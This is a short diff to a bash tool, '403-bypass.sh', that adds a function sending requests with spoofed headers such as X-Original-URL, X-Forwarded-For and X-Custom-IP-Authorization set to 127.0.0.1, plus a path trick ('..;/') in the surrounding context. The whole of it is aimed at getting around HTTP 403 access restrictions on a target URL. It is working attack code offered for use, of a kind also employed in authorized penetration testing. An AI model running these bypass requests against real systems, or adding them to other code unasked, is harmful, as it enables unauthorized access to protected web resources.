@@ -44,6 +44,15 @@ function bypass_methods() {
     make_request "${TARGET_URL}/${TARGET_PATH}..;/"
 }
 
+function header_bypass_methods() {
+    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Original-URL: ${TARGET_PATH}'"
+    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
+    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Forwarded-For: 127.0.0.1'"
+    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Forwarded-Host: 127.0.0.1'"
+    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Host: 127.0.0.1'"
+    make_request "${TARGET_URL}" "-H 'X-rewrite-url: ${TARGET_PATH}'"
+}
+
 if [[ $# -ne 2 ]]; then
     echo "Invalid arguments. Usage: ./403-bypass.sh [URL] [path]"
     exit 1
